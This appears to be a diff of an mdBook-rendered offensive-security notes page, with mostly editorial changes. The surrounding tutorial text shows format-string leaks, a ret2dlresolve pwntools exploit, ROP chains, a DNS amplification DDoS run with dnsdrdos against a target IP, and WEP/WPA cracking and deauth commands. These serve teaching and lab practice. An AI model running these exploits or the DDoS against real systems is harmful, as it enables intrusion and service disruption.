@@ -859,7 +859,6 @@ scanf(&quot;%100s&quot;, input);
 
 printf(&quot;%100s&quot;, input);
 </code></pre>
-<h1 id="examples"><a class="header" href="#examples">Examples</a></h1>
 <h2 id="leaking-memory"><a class="header" href="#leaking-memory">Leaking Memory</a></h2>
 <p>Format string vulnerabilities can be easily exploited to leak memory on the stack. This is typically done through the use of the <code>%p</code> or <code>%x</code> format parameters. Filling a format string with those parameters will continuously leak stack memory. Sometimes, however, the buffer we are writing to doesn't have enough space to store enough parameters for us to reach the value we want to leak. Luckily, C has some syntax sugar which allows us to retrieve a particular argument. This is done by using <code>%n\\( parameter</code>, where <code>n</code> is the number of the argument we want to access and <code>parameter</code> is the format parameter we want to use. Consequently, if we want to print the third value on the stack as a pointer, we would use <code>%n \\)p</code>.</p>
 <p>Here is a simple example of such an attack.</p>
@@ -949,14 +948,14 @@ int main(int argc, char *argv[])
 <p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_write_pipe.png" alt="" /></p>
 <p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/FSV_write_pwn.png" alt="" /></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-8"><a class="header" href="#introduction-8">Introduction</a></h1>
-<p>This is a highly sophisticated attack which leverages the way dynamic library functions are resolved at runtime in order to resolve an arbitrary procedure and invoke it, bypassing ASLR and requiring no leaks.</p>
-<p>To understand the following content, you must know a lot about <a href="Exploitation/Binary%20Exploitation/Stack%20Exploitation/../../../Reverse%20Engineering/Binary%20Formats/ELF/Dynamic%20Linking.html">dynamic linking</a> with ELF files.</p>
+<p>This is a highly sophisticated attack which leverages the way dynamic library functions are resolved at runtime in order to resolve an arbitrary procedure and invoke it.</p>
+<p>To understand the following content, knowledge of <a href="Exploitation/Binary%20Exploitation/Stack%20Exploitation/../../../Reverse%20Engineering/Binary%20Formats/ELF/Dynamic%20Linking.html">dynamic linking</a> with ELF files is necessary.</p>
 <h1 id="theory"><a class="header" href="#theory">Theory</a></h1>
 <p>It is possible to use <code>_dl_resolve</code> to call any external function by creating a fake relocation table, symbol table, string table, and GOT. <code>_dl_resolve</code> performs no upper boundary checks on the relocation argument, which means that we can make it arbitrarily large and thus point it to our fake relocation table. From there, we can do the same with the rest of the offsets. It does, however, check a few other things which we will need to work around.</p>
 <p>Because of the checks that <code>_dl_resolve</code> performs, the <code>r_info</code> must be divisible by 0x18. The distance between the real symbol table and our fake one must be divisible by 0x18 and fit in 32 bits after this division. This practically prevents us from using the stack on 64-bit systems to store our fake tables and we will need to utilise the <code>.bss</code> section, which is closer to the real symbol table in the executable. Additionally, <code>r_info</code> must end in 0x7.</p>
 <p>For the sake of simplicity, all of the fake tables will only contain one entry. Once we have the fake symbol table set up, we need to set <code>st_other</code> to 0 and <code>st_name</code> to the distance between the real string table and our fake one, which can in this case be a single null-terminated string. Next, <code>r_info</code> must be populated with <code>(( RealToFakeSymbolTableOffset / 0x18 ) &lt;&lt; 32 ) | 0x7</code>, where <code>RealToFakeSymbolTableOffset</code> is the 0x18 aligned distance between our fake and real symbol tables. Do not worry about all the bit-wise operations - these are taken care of by a few macros in <code>_dl_resolve</code>. <code>r_offset</code> on the other hand, must contain the distance between our fake global offset table and the ELF header.</p>
 <p>The relocation argument should store the offset between the start of the real relocation table and the beginning of the fake relocation table divided by the size of one relocation entry and should be put at the top of the stack. Consequently, if gaining code execution through a stack buffer overflow, the relocation argument should follow the malicious return address.</p>
-<h1 id="manual-exploitation"><a class="header" href="#manual-exploitation">Manual exploitation</a></h1>
+<h1 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h1>
 <pre><code class="language-cpp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 
@@ -981,7 +980,7 @@ int main()
 	
 }
 </code></pre>
-<p>Manually performing this exploit is extremely cumbersome, so in addition to the manual exploitation, I will also show you a neat module that pwntools contains for this exact purpose. Anyway, the fake tables should be set in the following way:</p>
+<p>Manually performing this exploit can be rather extremely cumbersome. Anyway, the fake tables should be set in the following way:</p>
 <p>Relocation argument:</p>
 <ul>
 <li>
@@ -1038,9 +1037,7 @@ program.sendline(b&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x30\x50\x55\x55
 program.interactive()
 </code></pre>
 <p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/RDLR_manual.png" alt="" /></p>
-<p>The <code>abort</code> procedure takes no arguments which made manual exploitation bearable, however, when you want to invoke a function with parameters, such as <code>system</code>, you will need to either execute additional shellcode before jumping to PLT0, or build a ROP chain. If you value your life, never exploit this manually.</p>
-<h2 id="exploiting-with-pwntools"><a class="header" href="#exploiting-with-pwntools">Exploiting with pwntools</a></h2>
-<p><code>pwntools</code> has an awesome module for performing this exploit.</p>
+<p>The <code>abort</code> procedure takes no arguments which made manual exploitation easier, however, when you want to invoke a function with parameters, such as <code>system</code>, you will need to either execute additional shellcode before jumping to PLT0, or build a ROP chain.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-9"><a class="header" href="#introduction-9">Introduction</a></h1>
 <p>Return-oriented programming is a set of techniques which allow code execution and bypass data execution prevention defences, such as NX, and code signing. ROP utilises <em>gadgets</em> in order to build chains and execute arbitrary instruction sequences.</p>
 <p>Given control over the stack, an attacker may fill it with malicious return addresses, all pointing to the subsequent gadget in the ROP chain. When one gadget is executed, the <code>ret</code> instruction jumps to the address stored at the top of the stack and the stack pointer is incremented. Consequently, the stack pointer now points to the next malicious return address, forming a chain of gadgets.</p>
@@ -1049,7 +1046,7 @@ program.interactive()
 <p><code>ROPgadget --binary [binary name]</code></p>
 <p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_ropgadget.png" alt="" /></p>
 <p>(This is just a small portion of the output.)</p>
-<h1 id="exploitation-1"><a class="header" href="#exploitation-1">Exploitation</a></h1>
+<h1 id="exploitation-2"><a class="header" href="#exploitation-2">Exploitation</a></h1>
 <pre><code class="language-cpp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 
@@ -1089,7 +1086,7 @@ int main()
 <p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual_input.png" alt="" /></p>
 <p>And... exploit!</p>
 <p><img src="Exploitation/Binary%20Exploitation/Stack%20Exploitation/Resources/Images/ROP_manual_exp.png" alt="" /></p>
-<h1 id="exploiting-with-pwntools-1"><a class="header" href="#exploiting-with-pwntools-1">Exploiting with pwntools</a></h1>
+<h1 id="exploiting-with-pwntools"><a class="header" href="#exploiting-with-pwntools">Exploiting with pwntools</a></h1>
 <p><code>pwntools</code> comes with tools for automating the process of finding gadgets and stringing them into chains for exploitation.</p>
 <p>You will first need to load the ELF executable and specify its base address:</p>
 <pre><code class="language-python">elf = ELF('./rop')
@@ -1142,12 +1139,12 @@ prog.interactive()
 <div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-10"><a class="header" href="#introduction-10">Introduction</a></h1>
 <p>A flaw of all DNS name servers is that if they contain incorrect information, they may spread it to clients or other name servers. Each DNS name server (even individual clients) has a DNS cache. The system stores there information about any responses it gets for domains it requested. An attacker could inject false entries in this cache and as such, any computer which queries the poisoned name server will receive false results. This is known as <em>DNS cache poisoning</em>. </p>
 <p>The attack can be used to redirect users to a different website than the requested one. As such, it opens opportunities for phishing attacks by creating evil twins of login portals for well-known sites.</p>
-<p>A tool for performing such targeted attacks is <a href="https://github.com/b4ckslash0/deserter">deserter</a>. Usage information is available on its GitHub page.</p>
+<p>A tool for performing such targeted attacks is <a href="https://github.com/cr0mll/deserter">deserter</a>. Usage information is available on its GitHub page.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="what-is-dns-traffic-amplification"><a class="header" href="#what-is-dns-traffic-amplification">What is DNS Traffic Amplification?</a></h1>
 <p>A DNS (Traffic) Amplificaton attack is a popular form of a distributed denial of service (DDoS) attack, which abuses open DNS resolvers to flood a target system with DNS response traffic. It's called an <em>amplification</em> attack because it uses DNS responses to upscale the size of the data sent to the victim.</p>
 <h1 id="how-does-it-work"><a class="header" href="#how-does-it-work">How does it work?</a></h1>
 <p>An attacker sends a DNS name lookup to an open resolver with the source IP spoofed to be the victim's IP address. That way, any response traffic would be sent to the victim and not the attacker. The requests submitted by the attacker usually aim to query for as much information as possible in order to maximise the amplification effect. In most cases, the queries sent are of type <code>ANY</code> which requests all known information about a particular DNS zone. Using a botnet, it's easy to create immense amounts of traffic. It is also rather difficult to protect against these attacks because the traffic is coming from legitimate sources - real DNS servers.</p>
-<h1 id="conducting-a-dns-traffic-amplification-attack"><a class="header" href="#conducting-a-dns-traffic-amplification-attack">Conducting a DNS Traffic Amplification Attack</a></h1>
+<h2 id="conducting-a-dns-traffic-amplification-attack"><a class="header" href="#conducting-a-dns-traffic-amplification-attack">Conducting a DNS Traffic Amplification Attack</a></h2>
 <h3 id="testing-a-dns-server-for-attack-surface"><a class="header" href="#testing-a-dns-server-for-attack-surface">Testing a DNS server for attack surface</a></h3>
 <p>We should first check if a DNS Traffic Amplification is possible and if it's viable. We can do this through <a href="Exploitation/DNS/">Metasploit</a> using the module <code>auxiliary/scanner/dns/dns_amp</code>.</p>
 <p><img src="Exploitation/DNS/Resources/Images/msf6-dns-amp.png" alt="" /></p>
@@ -1160,7 +1157,7 @@ prog.interactive()
 </code></pre>
 <pre><code class="language-bash">gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
 </code></pre>
-<pre><code class="language-bash">┌──(backslash0@kali)-[~/MHN/DNS]-[]
+<pre><code class="language-bash">┌──(cr0mll@kali)-[~/MHN/DNS]-[]
 └─\\(  wget https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
 --2021-09-21 13:01:11--  https://raw.githubusercontent.com/rodarima/lsi/master/entrega/p2/dnsdrdos.c
 Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
@@ -1173,19 +1170,19 @@ dnsdrdos.c                                                  100%[===============
 
 2021-09-21 13:01:11 (17.9 MB/s) - ‘dnsdrdos.c’ saved [15109/15109]
 
-┌──(backslash0@kali)-[~/MHN/DNS]-[]
+┌──(cr0mll@kali)-[~/MHN/DNS]-[]
 └─ \\) gcc -o dnsdrdos dnsdrdos.c -Wall -ansi
 </code></pre>
 <p>Now, create a file containing the IP's of each DNS server you want to use in the attack (only one IP per line). Use the following syntax to run the attack:</p>
 <pre><code class="language-bash">sudo ./dnsdrdos -f &lt;dns servers file&gt; -s &lt;target IP&gt; -d &lt;domain&gt; -l &lt;number of loops through the list&gt;
 </code></pre>
-<pre><code class="language-bash">┌──(backslash0@kali)-[~/MHN/DNS]-[]
+<pre><code class="language-bash">┌──(cr0mll@kali)-[~/MHN/DNS]-[]
 └─\\(  sudo ./dnsdrdos -f dns_servers -s 192.168.129.2 -d nsa.gov -l 30
 -----------------------------------------------    
 dnsdrdos - by noptrix - http://www.noptrix.net/    
 -----------------------------------------------
 
-┌──(backslash0@kali)-[~/MHN/DNS]-[]
+┌──(cr0mll@kali)-[~/MHN/DNS]-[]
 └─ \\)
 </code></pre>
 <p>The output may be empty, but the packets were sent. You can verify this with <code>wireshark</code>:</p>
@@ -3232,11 +3229,11 @@ movl (%ebx),%eax
 <p>Since certain processes may interfere with the wireless device, they should be checked for before putting the wireless card into monitor mode. This can be done via the following command:</p>
 <pre><code>sudo airmon-ng check
 </code></pre>
-<p><img src="Hardware%20Hacking/Wireless%20Attacks/Wireless%20Attacks/Resources/Images/WIFI_airmon_check.png" alt="" /></p>
+<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_check.png" alt="" /></p>
 <p><code>airmon-ng</code> is also capable of stopping these processes if <code>kill</code> is added to the above command:</p>
 <pre><code>sudo airmon-ng check kill
 </code></pre>
-<p><img src="Hardware%20Hacking/Wireless%20Attacks/Wireless%20Attacks/Resources/Images/WIFI_airmon_check_kill.png" alt="" /></p>
+<p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_airmon_check_kill.png" alt="" /></p>
 <p>A list of the available network devices may be obtained through <code>iwconfig</code>:</p>
 <p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_iwconfig_list.png" alt="" /></p>
 <p>In order to put a wireless card into monitor mode, the following command may be used:</p>
@@ -3328,7 +3325,7 @@ sudo ifconfig &lt;dev&gt; up
 <p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WIFI_aireplay_deauth.png" alt="" /></p>
 <p>If the target is not disconnected on the first try, you can always send more deauthentication frames!</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-39"><a class="header" href="#introduction-39">Introduction</a></h1>
-<p>The <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(802.11)/Encryption%20&amp;%20Integrity.html#wireless-equivalent-privacy-wep">WEP</a> standard was introduced in 1997 and its goal was to provide the same level of privacy to wireless networks that wired ones had. Unfortunately, a series of severe flaws quickly made it obsolete and it was superseded by WPA and WPA2. While rare, it is still possible to find networks today which use WEP. </p>
+<p>The standard was introduced in 1997 and its goal was to provide the same level of privacy to wireless networks that wired ones had. Unfortunately, a series of severe flaws quickly made it obsolete and it was superseded by WPA and WPA2. While rare, it is still possible to find networks today which use WEP. </p>
 <p>As a corollary of the IV's small size - only 24 bits - IVs will have to eventually be repeated. On average, this occurs every 6 000 frames. Due to the inner structure of WEP, once an attacker gets their hands on two ciphertexts (encrypted packets), \( c_1 \) and \( c_2 \), which were encrypted with the same IV (the key is already the same for both of them), then they know \( c_1 \oplus c_2 \). Now, the adversary can begin brute-forcing the corresponding plaintexts, \( p_1 \) and \( p_2 \). Typically, there would be a large number of possible \( p_1 \)s and \( p_2 \)s, but it is known that they must look like packets which greatly reduces the possibilities. This is narrowed down even further when performing a fake authentication attack since the packets captured with identical IVs are likely ARP responses from the AP which have an even easier form to predict! 
 Since \( c_1 \oplus c_2 = p_1 \oplus p_2 \), with the correct \( p_1 \) and \( p_2 \) brute-forced, the keystream used to encrypt them can be calculated: \( c_1 \oplus p_1 = k \). Through the use of a few more techniques such as Fluhrer, Mantin, and Shamir (FMS) attacks or PWT, the original key can be retrieved.</p>
 <h1 id="capturing-the-traffic"><a class="header" href="#capturing-the-traffic">Capturing the Traffic</a></h1>
@@ -3344,7 +3341,7 @@ Since \( c_1 \oplus c_2 = p_1 \oplus p_2 \), with the correct \( p_1 \) and \( p
 <p>Now, you will need to be patient in order to gather a large amount of frames, typically in the range of 50K - 200K depending on whether the key is 64 or 128 bits in length. On a calm network, however, this process may take a very long time. Luckily, it can be sped up using a <em>fake authentication attack</em> and <em>ARP packet replay</em>.</p>
 <h1 id="fake-authentication-attack"><a class="header" href="#fake-authentication-attack">Fake Authentication Attack</a></h1>
 <p>The ultimate goal of this attack is to enable an adversary to force the AP to send out more and more packets, typically through ARP replay, so that more IVs can be captured. However, in order to elicit any proper response with an IV from the access point, the attacker must be authenticated and and their MAC address needs to be associated with it. Otherwise, the AP simply replies with a deauth frame in cleartext to any packets sent by the adversary, which generates no IVs.</p>
-<p>WEP supports two types of authentication - <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(802.11)/Authentication%20&amp;%20Association.html#open-authentication">Open System Authentication (OSA)</a> and <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(802.11)/Authentication%20&amp;%20Association.html#shared-key-authentication">Shared Key Authentication</a>. </p>
+<p>WEP supports two types of authentication - <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#open-authentication">Open System Authentication (OSA)</a> and <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#shared-key-authentication">Shared Key Authentication</a>. </p>
 <p>On the other hand, now that they are associated with the network, they can elicit responses with IVs from the AP.</p>
 <p>When OSA is enabled, you can use the following command to authenticate with the AP:</p>
 <pre><code>sudo aireplay-ng -1 &lt;rate&gt; -e &lt;ESSID&gt; -a &lt;access point MAC&gt; -h &lt;MAC of your wireless adapter&gt; &lt;dev&gt;
@@ -3360,7 +3357,7 @@ Since \( c_1 \oplus c_2 = p_1 \oplus p_2 \), with the correct \( p_1 \) and \( p
 <p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_fake_auth_open_success.png" alt="" /></p>
 <p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_airodump_fake_auth_open_success.png" alt="" /></p>
 <p>Now that the client is associated with the network, they can elicit responses with IVs from the AP and can proceed to ARP relaying.</p>
-<p>If OSA is not allowed by the target network, then the process is a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(802.11)/Authentication%20&amp;%20Association.html#shared-key-authentication">bit more complicated</a>, but still not secure.</p>
+<p>If OSA is not allowed by the target network, then the process is a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html#shared-key-authentication">bit more complicated</a>, but still not secure.</p>
 <p>If you are able to sniff on the network, you can just capture the shared key handshake when another client authenticates to the AP (either naturally or by dint of a <a href="Hardware%20Hacking/Wireless%20Attacks/Deauth%20Attack.html">deauth attack</a>. Since you captured the plaintext challenge, \( p_1 \) from the AP and the correctly encrypted response challenge from the legitimate client, \( c_1 \), you can obtain the keystream \( k = p_1 \oplus c_1 \) and use it to correctly encrypt the challenge you receive when attempting to connect to the AP yourself.</p>
 <p>Faking shared key authentication requires a PRGA file containing the SKA (shared key authentication) handshake. To acquire it, all you need to do is sniff on the network and either wait for a client to connect to it or deauthenticate an existing one to force them to reconnect. When the handshake has been captured, <code>SKA</code> will appear beneath the <code>AUTH</code> column in <code>airodump-ng</code>.</p>
 <pre><code>sudo airodump-ng --encrypt WEP --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;filename&gt; &lt;dev&gt;
@@ -3388,7 +3385,7 @@ Since \( c_1 \oplus c_2 = p_1 \oplus p_2 \), with the correct \( p_1 \) and \( p
 <p><img src="Hardware%20Hacking/Wireless%20Attacks/Resources/Images/WEP_aircrack_crack_key.png" alt="" /></p>
 <p>If the key isn't found, then that means that no identical IVs were captured and the process needs to be repeated.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-40"><a class="header" href="#introduction-40">Introduction</a></h1>
-<p>When connecting a device to a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(802.11)/WiFi%20Protected%20Access%20(WPA).html">WPA</a> WiFi network, the device and the access point go through the process of a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(802.11)/Authentication%20&amp;%20Association.html">4-way handshake</a>. During this time, the hash of the password is broadcasted and if we can capture this hash, we can also attempt to crack it.</p>
+<p>When connecting a device to a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/WiFi%20Protected%20Access%20(WPA).html">WPA</a> WiFi network, the device and the access point go through the process of a <a href="Hardware%20Hacking/Wireless%20Attacks/../../Networking/Protocols/WLAN%20(IEEE%20802.11)/Authentication%20&amp;%20Association.html">4-way handshake</a>. During this time, the hash of the password is broadcasted and if we can capture this hash, we can also attempt to crack it.</p>
 <h1 id="capturing-the-handshake"><a class="header" href="#capturing-the-handshake">Capturing the Handshake</a></h1>
 <p>You will first need to put your adapter into <a href="Hardware%20Hacking/Wireless%20Attacks/index.html">monitor mode</a>:</p>
 <pre><code>sudo airmon-ng start &lt;dev&gt;
@@ -3648,7 +3645,7 @@ In reality, there is usually more than a single name server for a big company li
 <p>Next is the <code>More Fragments</code> field. If a datagram was fragmented into multiple frames, this field will be set to 1 for all frames except the last one. </p>
 <p>Afterwards comes the <code>Retry</code> field. A value of 1 indicates that this frame is a <em>retransmission</em> of a frame which did not receive a confirmation (ACK).</p>
 <p>The <code>Power Management</code> field is set to 1 if the station uses power saving mode, which means that periodically shuts down some of its components to preserve power. Frames with this bit set but no actual data are used to inform the AP of the station's power saving mode. The AP will then buffer frames intended for this client.</p>
-<p>The `More Data field indicates whether or not the AP has more buffered frames to send to a station in power saving mode. Receiving a frame with this bit set to 1 which cause the station to wait to receive all frames from the AP before proceeding with its power saving shenanigans. </p>
+<p>The <code>More Data</code> field indicates whether or not the AP has more buffered frames to send to a station in power saving mode. Receiving a frame with this bit set to 1 which cause the station to wait to receive all frames from the AP before proceeding with its power saving shenanigans. </p>
 <p>The <code>Protected Frame</code> bit is set to 1 when the payload of the frame is encrypted and is 0 otherwise. </p>
 <p>Finally, the <code>Order</code> bit should be set to 0 for all frames with the exception of non-QoS data frames. In this case, this bit is set to 1 if a request from a higher layer for the data to be sent using a strictly ordered Class of Service. This tells the receiving station to process the frames in order.</p>
 <h2 id="duration--id"><a class="header" href="#duration--id">Duration / ID</a></h2>
@@ -3704,9 +3701,9 @@ In reality, there is usually more than a single name server for a big company li
 <h2 id="frame-check-sequence-fcs"><a class="header" href="#frame-check-sequence-fcs">Frame Check Sequence (FCS)</a></h2>
 <p>Similarly to Ethernet, this field is used to verify the integrity of the rest of the frame.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-52"><a class="header" href="#introduction-52">Introduction</a></h1>
-<p>Management frames render the service of managing the Service Set. They have 3 addresses in their MAC header and are 24 bytes in size for 802.11a/b/g/, and 28 bytes for 802.11n (additional 4 bytes for the HT Control field). Their type in the <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../index.html#frame-control">Frame Control</a> is indicated by <code>00</code>. Moreover, management frames are never forwarded to the DS, so they have the <code>FromDS</code> and <code>ToDS</code> bits set to 0 in their Frame Control. </p>
+<p>Management frames render the service of managing the Service Set. They have 3 addresses in their MAC header, which is 24 bytes in size for 802.11a/b/g/, and 28 bytes for 802.11n (additional 4 bytes for the HT Control field). Their type in the <a href="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/../index.html#frame-control">Frame Control</a> is indicated by <code>00</code>. Moreover, management frames are never forwarded to the DS, so they have the <code>FromDS</code> and <code>ToDS</code> bits set to 0 in their Frame Control. </p>
 <p><img src="Networking/Protocols/WLAN%20(IEEE%20802.11)/Management%20Frames/Resources/Images/Management_Frame.svg" alt="" /></p>
-<p>The source and destination MAC addresses are self-explanatory. The third address is the BSS ID which can either be MAC of the AP or a wildcard value (for probe requests). If 802.11n is used, there is also an HT Control field in the MAC header. The frame body (payload) is comprised of fixed-size fields and variable-size information elements.</p>
+<p>The source and destination MAC addresses are self-explanatory. The third address is the BSS ID which can either be the MAC of the AP or a wildcard value (for probe requests). If 802.11n is used, there is also an HT Control field in the MAC header. The frame body (payload) is comprised of fixed-size fields and variable-size information elements.</p>
 <p>There are 12 subtypes of management frames:</p>
 <div class="table-wrapper"><table><thead><tr><th style="text-align: center">Subtype Bits</th><th style="text-align: center">Meaning</th></tr></thead><tbody>
 <tr><td style="text-align: center"><code>0000</code></td><td style="text-align: center">Association Request</td></tr>
@@ -4150,7 +4147,7 @@ WME vendor-specific elements.</p>
 <p>Reference clocks are not directly connected to the network. Instead, the so-called <em>primary time servers</em> connect to the reference clock and synchronise their clocks with it. These servers have a stratum value of 1. For each layer you go down the chain, the stratum value increases by 1, since the distance from the reference clocks augments.</p>
 <p><img src="Networking/Protocols/Resources/Images/NTP/Hierarchy.png" alt="" /></p>
 <h1 id="synchronising-time-on-linux-with-ntpdate"><a class="header" href="#synchronising-time-on-linux-with-ntpdate">Synchronising time on Linux with <code>ntpdate</code></a></h1>
-<p><code>ntpdate</code> is a useful utility for synching time on Linux machines through NTP. It's syntax is really simple:</p>
+<p><code>ntpdate</code> is a useful utility for synching time on Linux machines through NTP. Its syntax is really simple:</p>
 <p><code>ntpdate [server]</code></p>
 <p>In order to set the date, it requires root privileges:</p>
 <p><img src="Networking/Protocols/Resources/Images/NTP/wrong_time.png" alt="" /></p>
@@ -4378,6 +4375,22 @@ WME vendor-specific elements.</p>
 
         </div>
 
+        <!-- Livereload script (if served using the cli tool) -->
+        <script type="text/javascript">
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
 
 
 
